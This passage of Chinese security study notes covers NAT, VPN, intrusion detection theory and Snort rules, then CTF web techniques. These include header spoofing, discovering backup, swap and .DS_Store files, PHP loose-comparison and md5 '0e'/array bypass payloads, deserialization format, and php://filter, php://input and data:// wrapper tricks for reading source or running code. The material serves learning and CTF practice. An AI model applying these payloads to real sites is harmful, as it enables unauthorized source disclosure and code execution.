
<ul>
<li><p>NAT(网络地址转换)</p>
<p>–允许多个用户分享少量或单一的IP地址（源NAT）</p>
<p>–允许将网络服务映射到内部服务网络IP和端口（目的NAT）</p>
</li>
<li><p>NAT代理优势</p>
<p>–方便：任意使用私有网段IP地址，无需申请，无冲突</p>
<p>–安全：对外隐藏内部网络信息</p>
</li>
</ul>
<h3 id="13-2-3-VPN"><a href="#13-2-3-VPN" class="headerlink" title="13.2.3 VPN"></a>13.2.3 VPN</h3><ul>
<li><p>VPN－虚拟专有网(Virtual Private Network)</p>
<p>–利用大规模网络(如Internet)上公用链路代替物理链路构建的安全专有网络。</p>
<p>–大型跨地域企业构建企业网的常用方案。</p>
</li>
<li><p>VPN类型</p>
<p>–IPSEC VPN(网络层)</p>
<p>–SSL VPN(传输层)</p>
</li>
<li><p>VPN产品</p>
<p>–国内通常在防火墙上集成</p>
<p>–专用VPN设备</p>
</li>
<li><p>开源VPNOpenVPN</p>
</li>
</ul>
<h3 id="13-2-4-内网安全管理"><a href="#13-2-4-内网安全管理" class="headerlink" title="13.2.4 内网安全管理"></a>13.2.4 内网安全管理</h3><ul>
<li><p>70%以上安全事故是由网络内部原因造成的</p>
<p>–防火墙等边界安全防护不能应对</p>
<p>–内网安全管理的必要性</p>
</li>
<li><p>内网安全管理</p>
<p>–有效地对内网终端进行安全管理和健康状态监控，从而增强内部网络的安全性</p>
<p>–终端安全管理</p>
<p>–终端运维管理</p>
<p>–终端补丁分发管理</p>
<p>–系统日志管理</p>
</li>
</ul>
<h3 id="13-2-5-内容安全管理-SCM"><a href="#13-2-5-内容安全管理-SCM" class="headerlink" title="13.2.5 内容安全管理(SCM)"></a>13.2.5 内容安全管理(SCM)</h3><ul>
<li><p>内容安全管理SCM</p>
<p>–关注对网络传输内容的安全性检查</p>
</li>
<li><p>网络行为监控</p>
<p>–网络行为监控审计</p>
<p>–绿色上网</p>
</li>
<li><p>防虫墙/防病毒网关</p>
<p>–防病毒、蠕虫网关</p>
</li>
<li><p>垃圾邮件过滤网关</p>
</li>
</ul>
<h3 id="13-2-6-边界安全防御发展趋势-UTM-amp-高性能"><a href="#13-2-6-边界安全防御发展趋势-UTM-amp-高性能" class="headerlink" title="13.2.6 边界安全防御发展趋势-UTM&amp;高性能"></a>13.2.6 边界安全防御发展趋势-UTM&amp;高性能</h3><ul>
<li><p>“胖”防火墙 转化为 UTM</p>
</li>
<li><p>UTM－统一威胁管理</p>
</li>
<li><p>Many features in one box</p>
<p>–网络访问与控制: 防火墙, …</p>
<p>–加密与身份认证: VPN, …</p>
<p>–SCM: 垃圾邮件过滤, 防病毒, IDS/IPS, 上网监管, …</p>
</li>
</ul>
<h2 id="13-3-D：检测技术"><a href="#13-3-D：检测技术" class="headerlink" title="13.3 D：检测技术"></a>13.3 D：检测技术</h2><h3 id="13-3-1-入侵检测系统基本概念"><a href="#13-3-1-入侵检测系统基本概念" class="headerlink" title="13.3.1 入侵检测系统基本概念"></a>13.3.1 入侵检测系统基本概念</h3><ul>
<li><p>入侵检测(Intrusion Detection)</p>
<p>–入侵检测，顾名思义，就是对入侵行为的检测与发现。</p>
<p>–入侵检测即为通过对计算机网络或计算机系统中若干关键点信息的收集和分析，从中发现入侵行为的一种安全技术。</p>
</li>
<li><p>入侵(Intrusion)</p>
<p>–一次入侵可被定义为任何尝试破坏信息资源的保密性、完整性或可用性的行为。</p>
</li>
<li><p>入侵检测系统(Intrusion Detection System)</p>
<p>–实现入侵检测技术，专门用于入侵行为发现和处理的软件系统或硬件设备。</p>
</li>
<li><p>防火墙VS IDS：门卫 VS 巡逻队</p>
</li>
</ul>
<h3 id="13-3-2-入侵检测技术的发展历程"><a href="#13-3-2-入侵检测技术的发展历程" class="headerlink" title="13.3.2 入侵检测技术的发展历程"></a>13.3.2 入侵检测技术的发展历程</h3>
<h4 id="13-3-2-1-Denning入侵检测模型"><a href="#13-3-2-1-Denning入侵检测模型" class="headerlink" title="13.3.2.1 Denning入侵检测模型"></a>13.3.2.1 Denning入侵检测模型</h4>
<h4 id="13-3-2-2-为什么Gartner说IDS已死"><a href="#13-3-2-2-为什么Gartner说IDS已死" class="headerlink" title="13.3.2.2 为什么Gartner说IDS已死"></a>13.3.2.2 为什么Gartner说IDS已死</h4><ul>
<li><p>入侵检测产品的误报、漏报和对攻击行为缺乏实时响应等问题突出，严重影响了产品发挥实际的作用。</p>
</li>
<li><p>Gartner认为IDS不能给网络带来附加的安全，反而会增加管理员的困扰，建议用户使用入侵防御系统(Intrusion Prevention System)即IPS来代替IDS。</p>
</li>
<li><p>Gartner认为只有在线的或基于主机的攻击阻止(实时拦截)才是最有效的入侵防御系统。</p>
</li>
</ul>
<h4 id="13-3-2-3-入侵威胁分类图"><a href="#13-3-2-3-入侵威胁分类图" class="headerlink" title="13.3.2.3 入侵威胁分类图"></a>13.3.2.3 入侵威胁分类图</h4><ul>
<li><p>入侵者分类</p>
<p>–外部渗透者: 攻破外部访问控制</p>
<p>–内部渗透者: 假冒者(攻破过程控制),违法者(误用访问), 秘密用户(攻破逻辑控制)</p>
</li>
<li><p>检测分析模型</p>
<p>–误用检测：监视违反特定规则的权限误用行为，违法者检测</p>
<p>–异常检测：基于统计方法建立用户正常行为轮廓，假冒者检测</p>
</li>
</ul>

<h4 id="13-3-2-4-入侵检测抽象理论模型"><a href="#13-3-2-4-入侵检测抽象理论模型" class="headerlink" title="13.3.2.4 入侵检测抽象理论模型"></a>13.3.2.4 入侵检测抽象理论模型</h4>
<h4 id="13-3-2-5-通用入侵检测模型-CIDF"><a href="#13-3-2-5-通用入侵检测模型-CIDF" class="headerlink" title="13.3.2.5 通用入侵检测模型(CIDF)"></a>13.3.2.5 通用入侵检测模型(CIDF)</h4><p>CIDF（Common Intrusion Detection Framework，通用入侵检测模型）定义了IDS表达检测信息的标准语言以及IDS组件之间的通信协议。符合CIDF规范的IDS可以共享检测信息，相互通信，协同工作，还可以与其它系统配合实施统一的配置响应和恢复策略。</p>
<p>CIDF将一个入侵检测系统分为以下组件：</p>
<ul>
<li>事件产生器（Event generators）：从入侵检测系统外的整个计算环境中获得事件，并以CIDF gidos格式向系统的其他部分提供此事件。事件产生器是所有IDS所需要的，同时也是可以重用的。</li>
<li>事件分析器（Event analyzers）：从其他组件接收gidos，分析得到的数据，并产生新的gidos。如分析器可以是一个轮廓特征引擎。</li>
<li>响应单元（Response units ）：是对分析结果作出作出反应的功能单元，它可以终止进程、重置连接、改变文件属性等，也可以只是简单的报警。</li>
<li>事件数据库（Event databases）：是存放各种中间和最终数据的地方的统称，它可以是复杂的数据库，也可以是简单的文本文件。</li>
</ul>

<h4 id="13-3-2-6-入侵检测技术评估指标"><a href="#13-3-2-6-入侵检测技术评估指标" class="headerlink" title="13.3.2.6 入侵检测技术评估指标"></a>13.3.2.6 入侵检测技术评估指标</h4><ul>
<li><p>检测率(True Positive)</p>
<p>–攻击事件的检出效果：检测出攻击事件数和全部攻击数之比</p>
<p>–漏报率(false negative) : 攻击事件没有被检测到</p>
</li>
<li><p>误报率(False Positive)</p>
<p>–把正常事件识别为攻击并报警</p>
</li>
<li><p>检测率和误报率往往不能同时很好</p>
<p>–“基调悖论(base-rate fallacy)”</p>
<p>–实际的IDS的实现总是在检测率和虚警率之间徘徊，检测率高了，虚警率就会提高;同样虚警率降低了，检测率也就会降低。一般地，IDS产品会在两者中取一个折衷，并且能够进行调整，以适应不同的网络环境。</p>
</li>
</ul>
<h4 id="13-3-2-7-IDS准确率评判标准-ROC曲线"><a href="#13-3-2-7-IDS准确率评判标准-ROC曲线" class="headerlink" title="13.3.2.7 IDS准确率评判标准: ROC曲线"></a>13.3.2.7 IDS准确率评判标准: ROC曲线</h4><ul>
<li><p>对比ROC曲线所围成的面积</p>
</li>
<li><p>林肯实验室用接收器特性(ROC，Receiver Operating Characteristic)曲线来描述IDS的性能。</p>
<p>–ROC广泛用于输入不确定的系统的评估。</p>
<p>–该曲线可以刻画了IDS的检测率与误报率之间的变化关系。</p>
</li>
<li><p>根据一个IDS在不同的条件(在允许范围内变化的阈值，例如异常检测系统的报警门限等参数)下的误报率和检测率，分别把误报率和检测率作为横坐标和纵坐标，就可做出对应于该IDS的ROC曲线。</p>
</li>
</ul>
<p>如果一条直线向上，然后向右以45度角延伸，就是一个非常失败的IDS，它毫无用处；相反，ROC曲线下方的区域越大，IDS的准确率越高。</p>
<p>如图所示，IDS B的准确性高于IDS C，类似地，IDS A在所有的IDS中具有最高的准确性。</p>

<h3 id="13-3-3-入侵检测技术"><a href="#13-3-3-入侵检测技术" class="headerlink" title="13.3.3 入侵检测技术"></a>13.3.3 入侵检测技术</h3><ul>
<li><p>误用检测(misuse detection)</p>
<p>–也称为基于特征的检测(signature-based detection)</p>
<p>–建立起已知攻击的特征库</p>
<p>–判别当前行为活动是否符合已知的攻击特征</p>
</li>
<li><p>异常检测(anomaly detection)</p>
<p>–也称为基于行为的检测(behavior-based detection)</p>
<p>–首先建立起系统的正常模式轮廓</p>
<p>–若实时获得的系统或用户的轮廓值与正常值的差异超出指定的阈值，就进行入侵报警</p>
</li>
</ul>
<h4 id="13-3-3-1-误用检测"><a href="#13-3-3-1-误用检测" class="headerlink" title="13.3.3.1 误用检测"></a>13.3.3.1 误用检测</h4><ul>
<li><p>目前研究工作比较多，并且已经进入实用</p>
<p>–建立起已有攻击的模式特征库</p>
<p>–难点在于：如何做到动态更新，自适应</p>
</li>
<li><p>常用技术</p>
<p>–基于简单规则的模式匹配技术</p>
<p>–基于专家系统的检测技术</p>
<p>–基于状态转换分析的检测技术</p>
</li>
<li><p>攻击特征提取</p>
<p>–专家提取</p>
<p>–自动提取方法(研究热点)</p>
</li>
</ul>
<h5 id="13-3-3-1-1-IDA工作原理——模式匹配"><a href="#13-3-3-1-1-IDA工作原理——模式匹配" class="headerlink" title="13.3.3.1.1 IDA工作原理——模式匹配"></a>13.3.3.1.1 IDA工作原理——模式匹配</h5><ul>
<li><p>单模式匹配</p>
<p>–KMP算法  Knuth-Morris-Pratt</p>
<p>–BM算法   Boyer-Moore</p>
</li>
<li><p>多模式匹配</p>
<p>–AC算法  Aho-Corasick</p>
<p>–基于FSA(有限状态机)，对文本串扫描一次就可以找出匹配的所有模式</p>
</li>
</ul>
<h5 id="13-3-3-1-2-正则表达式的匹配"><a href="#13-3-3-1-2-正则表达式的匹配" class="headerlink" title="13.3.3.1.2 正则表达式的匹配"></a>13.3.3.1.2 正则表达式的匹配</h5><ul>
<li><p>正则表达式能够用来描述符合某类句法规则的字符串集，支持描述更为广泛的负载特征，这使得其能够广泛应用于入侵检测/入侵防御、病毒检测、协议识别等系统中。</p>
</li>
<li><p>构造正则表达式对应的自动机来解决正则表达式的匹配问题是流行的技术解决手段</p>
<p>–基于NFA的技术易于实现，占用状态存储空间较少，但匹配速度较慢。</p>
<p>–基于DFA的技术具有较快的匹配速度，但会引发状态数量呈指数增加。</p>
</li>
</ul>
<h4 id="13-3-3-2-异常检测"><a href="#13-3-3-2-异常检测" class="headerlink" title="13.3.3.2 异常检测"></a>13.3.3.2 异常检测</h4><ul>
<li><p>比较符合安全的概念，但是实现难度较大</p>
<p>–正常模式的知识库难以建立</p>
<p>–难以明确划分正常模式和异常模式</p>
</li>
<li><p>常用技术</p>
<p>–统计方法</p>
<p>–预测模式</p>
<p>–神经网络</p>
</li>
</ul>
<h3 id="13-3-4-入侵检测系统的分类与部署"><a href="#13-3-4-入侵检测系统的分类与部署" class="headerlink" title="13.3.4 入侵检测系统的分类与部署"></a>13.3.4 入侵检测系统的分类与部署</h3><h4 id="13-3-4-1-基于网络的入侵检测系统-NIDS"><a href="#13-3-4-1-基于网络的入侵检测系统-NIDS" class="headerlink" title="13.3.4.1 基于网络的入侵检测系统(NIDS)"></a>13.3.4.1 基于网络的入侵检测系统(NIDS)</h4><p>IDS可以放在防火墙或者网关的后面，以网络嗅探器的形式捕获所有的对内对外的数据包。</p>

<h4 id="13-3-4-2-基于审计的入侵检测系统-HIDS"><a href="#13-3-4-2-基于审计的入侵检测系统-HIDS" class="headerlink" title="13.3.4.2 基于审计的入侵检测系统(HIDS)"></a>13.3.4.2 基于审计的入侵检测系统(HIDS)</h4><ul>
<li><p>安全操作系统必须具备一定的审计功能，并记录相应的安全性日志</p>
</li>
<li><p>基于内核</p>
<p>从操作系统的内核接收数据</p>
</li>
<li><p>基于应用</p>
<p>从正在运行的应用程序中收集数据</p>
</li>
</ul>

<h4 id="13-3-4-3-分布式入侵检测系统-DIDS"><a href="#13-3-4-3-分布式入侵检测系统-DIDS" class="headerlink" title="13.3.4.3 分布式入侵检测系统(DIDS)"></a>13.3.4.3 分布式入侵检测系统(DIDS)</h4>
<h4 id="13-3-4-4-入侵检测系统的部署位置"><a href="#13-3-4-4-入侵检测系统的部署位置" class="headerlink" title="13.3.4.4 入侵检测系统的部署位置"></a>13.3.4.4 入侵检测系统的部署位置</h4><ul>
<li><p>当实际使用检测系统时，首先面临的问题就是决定应该在系统的什么位置安装检测和分析入侵行为用的感应器Sensor或检测引擎Engine。</p>
<p>–对于基于主机的IDS，一般来说直接将检测代理安装在受监控的主机系统上。</p>
<p>–对于基于网络的IDS，情况稍微复杂</p>
</li>
<li><p>IDS布局</p>
</li>
</ul>

<h3 id="13-3-5-入侵防御系统IPS"><a href="#13-3-5-入侵防御系统IPS" class="headerlink" title="13.3.5 入侵防御系统IPS"></a>13.3.5 入侵防御系统IPS</h3><ul>
<li><p>IDS与IPS</p>
<p>–IDS: 旁路监听，只起到Detection机制</p>
<p>–侧重低漏报率，造成误报率较高</p>
<p>–对使用者技术水平要求较高，应急响应及时</p>
</li>
<li><p>IPS:内联模式，实时处置数据包</p>
<p>–侧重低误报率（对正常业务不造成影响）</p>
<p>–高效的处理性能</p>
<p>–即插即用，无需使用者参与</p>
</li>
</ul>
<h3 id="13-3-6-著名的开源入侵检测系统-Snort"><a href="#13-3-6-著名的开源入侵检测系统-Snort" class="headerlink" title="13.3.6 著名的开源入侵检测系统-Snort"></a>13.3.6 著名的开源入侵检测系统-Snort</h3><h4 id="13-3-6-1-Snort概述"><a href="#13-3-6-1-Snort概述" class="headerlink" title="13.3.6.1 Snort概述"></a>13.3.6.1 Snort概述</h4><p>Snort是一个轻量级网络入侵检测系统，具有实时数据流分析和日志IP 网络数据包的功能，能够进行协议分析和内容搜索匹配，能够检测不同的攻击方式并对攻击进行实时报警。此外Snort 是一个跨平台、开放源代码的免费软件，所以Snort还具有很好的扩展性和可移植性。</p>
<h4 id="13-3-6-2-Snort结构"><a href="#13-3-6-2-Snort结构" class="headerlink" title="13.3.6.2 Snort结构"></a>13.3.6.2 Snort结构</h4><p>Snort主要包括四个模块：数据包嗅探器、预处理器、检测引擎和报警输出模块。</p>

<ol>
<li>数据包嗅探器模块</li>
</ol>
<p>主要用来实现网络数据包捕获和解析的功能。将捕获的网络数据包按照TCP/IP协议族的不同层次进行解析。</p>
<ol>
<li>预处理器模块</li>
</ol>
<p>针对可疑行为检查包或者修改包以便检测引擎能对其正确解释，还可以对网络流进行标准化，以便检测引擎能够准确匹配特征。</p>
<ol>
<li>检测引擎模块</li>
</ol>
<p>检测引擎模块是入侵检测系统实现的核心，当数据包从预处理器送过来后，检测引擎依据预先设置的规则检查数据包，一旦发现数据包中的内容和某条规则相匹配，就通知报警模块。</p>
<ol>
<li>报警/日志输出模块</li>
</ol>
<p>检测引擎检查后的Snort数据需要以某种方式输出。</p>
<h4 id="13-3-6-3-Snort规则结构"><a href="#13-3-6-3-Snort规则结构" class="headerlink" title="13.3.6.3 Snort规则结构"></a>13.3.6.3 Snort规则结构</h4><p>Snort采用基于规则的网络入侵模式搜索机制，对网络数据包进行模式匹配，从中发现入侵或恶意攻击行为。</p>
<p>Snort将所有已知的入侵行为以规则的形式存放在规则库中，每一条规则由规则头和规则选项两个部分组成。</p>
<p>规则头定义了规则的动作、所匹配网络报文的协议、源地址、目的地址、源端口及目标端口等信息；规则选项部分则包含了所要显示给用户查看的警告信息以及用来判定报文是否为攻击报文的其他信息。</p>

<p>Snort规则头部的主要结构如下所示。</p>

<ul>
<li>动作：当规则与包比对并符合条件时，会采取什么类型的动作。出现通常动作时产生报警或记录日志或向其他规则发出请求。</li>
<li>协议：用来在一个特定协议的包上应用规则。</li>
<li>地址：定义源或目的地址</li>
<li>端口：如果协议是TCP或UDP，端口部分用来确定规则所对应的包的源及目的端口。</li>
<li>方向：确定哪一边的地址和端口是源，哪一边是目的。</li>
</ul>
<p>例如，下述规则在探测到TTL为100的ICMP ping包时，就会产生报警：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert icmp any any -&gt; any any (msg: &quot;Ping with TTL=100&quot;; ttl: 100;)</span><br></pre></td></tr></table></figure>
<p>括号之前的部分叫做规则头部，括号中的部分叫做规则选项。头部依次包括下面部分：</p>
<ol>
<li>规则的动作：在这个规则中，动作是alert（报警），就是如果符合下面的条件，就会产生一个报警。如果产生报警，默认的情况下将会记录日志。</li>
<li>协议：在这个规则中，协议是ICMP，也就是说这条规则仅仅对ICMP包有效，如果一个包的协议不是ICMP， Snort探测引擎就不理会这个包以节省CPU时间。</li>
<li>源地址和源端口：在这个例子中，它们都被设置成了any，也就是这条规则将被应用在来自任何地方的ICMP包上，当然，端口号与ICMP是没有什么关系的，仅仅和TCP和UDP有关系。</li>
<li>方向：用→表示从左向右的方向，表示在这个符号的左面部分是源，右面是目的，也表示规则应用在从源到目的的包上。如果是←，那么就相反。注意，也可以用&lt;&gt;来表示规则将应用在所有方向上。</li>
<li>目的地址和端口：若都是any，则表示规则并不关心它们的目的地址。在这个规则中，由于any的作用，方向段并没有实际的作用，因为它将被应用在所有方向的ICMP包上。</li>
<li>在括号中的选项部分表示：如果包符合TTL=100的条件就产生一条包含文字“Ping with TTL=100”的报警。TTL是IP数据包头部字段。</li>
</ol>
<h4 id="13-3-6-4-Snort典型规则示例"><a href="#13-3-6-4-Snort典型规则示例" class="headerlink" title="13.3.6.4 Snort典型规则示例"></a>13.3.6.4 Snort典型规则示例</h4><p>Snort规则的本质就是简单模式匹配，即通过对数据包的分析得到所需信息，用以匹配自身的规则库。</p>
<p>在初始化并解析规则时，分别生成四个不同的规则树：TCP、UDP、ICMP和IP，每一个规则树即一个独立的三维链表：规则头（Rule Tree Node，RTN）、规则选项（Optional Tree Node，OTN）和指向匹配函数的指针。</p>

<p>Snort初始化时，会根据配置文件的要求加载相应的规则。Snort对每条规则进行三次分类：协议分类、源/目标端口分类、内容类别分类。 </p>
<h2 id="13-4-R：响应技术"><a href="#13-4-R：响应技术" class="headerlink" title="13.4 R：响应技术"></a>13.4 R：响应技术</h2><ul>
<li><p>计算机及网络取证技术</p>
<p>–分析攻击并寻找追溯线索</p>
<p>–保全并提取现场证据：法律执行部门</p>
</li>
<li><p>攻击追溯和响应</p>
<p>–Attacker Trace: very difficult, Step-stone attack</p>
<p>–以牙还牙, 以暴制暴? –并不可取</p>
</li>
<li><p>备份恢复</p>
<p>–建立良好的关键数据备份习惯</p>
<p>–RAID冗余磁盘阵列-&gt;冷备份-&gt;双机热备（保持业务连续性）</p>
</li>
<li><p>灾难恢复</p>
<p>–重要性数据的异地容灾备份：2/5的公司经历大灾难后再也不能恢复运作</p>
</li>
</ul>
<h1 id="14-HTTP"><a href="#14-HTTP" class="headerlink" title="14. HTTP"></a>14. HTTP</h1><h2 id="14-1-抓包关键点"><a href="#14-1-抓包关键点" class="headerlink" title="14.1 抓包关键点"></a>14.1 抓包关键点</h2><p><strong>Referer</strong></p>
<p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。Referer 常用在防盗链和防恶意请求中。传输referer需要在页面内添加相关的代码。</p>
<p><strong>User-Agent</strong></p>
<p>用来传输用户使用的是什么样的浏览器。有些网站为了防止爬虫，会检验User-Agent，只有当是用户访问的时候才会传输数据。</p>
<p><strong>X-Forwarded-For</strong></p>
<p>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。当今多数缓存服务器的用户为大型ISP，为了通过缓存的方式来降低他们的外部带宽，他们常常通过鼓励或强制用户使用代理服务器来接入互联网。有些情况下，这些代理服务器是透明代理，用户甚至不知道自己正在使用代理上网。<br>如果没有XFF或者另外一种相似的技术，所有通过代理服务器的连接只会显示代理服务器的IP地址，而非连接发起的原始IP地址，这样的代理服务器实际上充当了匿名服务提供者的角色，如果连接的原始IP地址不可得，恶意访问的检测与预防的难度将大大增加。<br>如果你使用透明代理上网，那么在透明代理发送给服务器端的HTTP请求中会包含x-forward-for信息<br>简单来说就是用来传输最原始ip地址的,阻止匿名请求的，但是可以通过抓包来修改。</p>
<p>小常识：网站的目录一般都在/var/www/html/</p>
<h2 id="14-2-Tornado框架"><a href="#14-2-Tornado框架" class="headerlink" title="14.2 Tornado框架"></a>14.2 Tornado框架</h2><p>Tornado框架的附属文件handler.settings中存在cookie_secret</p>
<p>尝试：error?msg= </p>
<h2 id="14-3-备份文件"><a href="#14-3-备份文件" class="headerlink" title="14.3 备份文件"></a>14.3 备份文件</h2><p>备份文件常用的后缀：.rar    .zip    .7z    .tar.gz    .bak    .swp    .txt    .html</p>
<h3 id="14-3-1-vim缓存"><a href="#14-3-1-vim缓存" class="headerlink" title="14.3.1 vim缓存"></a>14.3.1 vim缓存</h3><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。</p>
<p>以 index.php 为例：第一次产生的交换文件名为 <code>.index.php.swp</code></p>
<p>再次意外退出后，将会产生名为 <code>.index.php.swo</code> 的交换文件</p>
<p>第三次产生的交换文件则为 <code>.index.php.swn</code></p>
<h3 id="14-3-2-DS-Store文件利用"><a href="#14-3-2-DS-Store文件利用" class="headerlink" title="14.3.2 .DS_Store文件利用"></a>14.3.2 .DS_Store文件利用</h3><p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。 (直接在URL里加上<code>/.DS_Store</code>)</p>
<p>记事本打开查找文件，放在URL上。</p>
<h2 id="14-4-弱类型绕过"><a href="#14-4-弱类型绕过" class="headerlink" title="14.4 弱类型绕过"></a>14.4 弱类型绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">==		只要值相等</span><br><span class="line">===		不仅值相等还要数据类型相同</span><br></pre></td></tr></table></figure>
<p>例1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;	</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload:/?key=123</span></span><br></pre></td></tr></table></figure>
<p>例2：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload:/?password=404a</span></span><br></pre></td></tr></table></figure>
<p>例3：md5绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.replace(&#x27;./levell14.php&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>（1）找出md5值都是两个0e开头的开头的。原理是php里面在做 == 的时候会先把两边的类型转成一样的，因为是0e开头，php会认为它是科学技计数法，而0的多少次方都是0。举例：QNKCDZO、s155964671a、s1091221200a。</p>
<p>（2）数组绕过。原理是md5等函数不能处理数组，导致函数返回Null。而Null是等于Null的，导致了绕过。 举例：a[]=1&amp;b[]=2。做===的时候只能用数组绕过。</p>
<h2 id="14-5-序列号与反序列化"><a href="#14-5-序列号与反序列化" class="headerlink" title="14.5 序列号与反序列化"></a>14.5 序列号与反序列化</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">serialize</span>()		序列化</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>()	反序列化</span><br><span class="line"></span><br><span class="line">O:<span class="title function_ invoke__">strlen</span>(<span class="keyword">object</span> name):<span class="keyword">object</span> name:<span class="keyword">object</span> size:&#123;s:<span class="title function_ invoke__">strlen</span>(property name):property name:property definition;(repeated per property)&#125;</span><br><span class="line"></span><br><span class="line">O:<span class="number">4</span>:“Flag”:<span class="number">1</span>:&#123;s:<span class="number">4</span>:“file”;s:<span class="number">8</span>:“flag.php”;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="14-6-伪协议"><a href="#14-6-伪协议" class="headerlink" title="14.6 伪协议"></a>14.6 伪协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">php://filter用于读取源码</span><br><span class="line">用法：php://filter/read=convert.base64-encode/resource=xxx</span><br><span class="line"></span><br><span class="line">php://input用于执行php代码，需要POST请求提交数据</span><br><span class="line"></span><br><span class="line">data://text/plain用于数据流的读取，如果传入的数据是php代码，就会执行代码</span><br><span class="line">用法：data://text/plain;base64,xxxx(base64编码后的数据)</span><br><span class="line"></span><br><span class="line">file://用于访问本地文件系统</span><br><span class="line">用法：file://[文件的绝对路径]</span><br></pre></td></tr></table></figure>
<h3 id="14-6-1-data-text-plain"><a href="#14-6-1-data-text-plain" class="headerlink" title="14.6.1 data://text/plain"></a>14.6.1 data://text/plain</h3><p>条件</p>
<p>allow_url_fopen: on</p>
<p>allow_url_include: on</p>
<p>例：[ZJCTF 2019]NiZhuanSiWei 1</p>
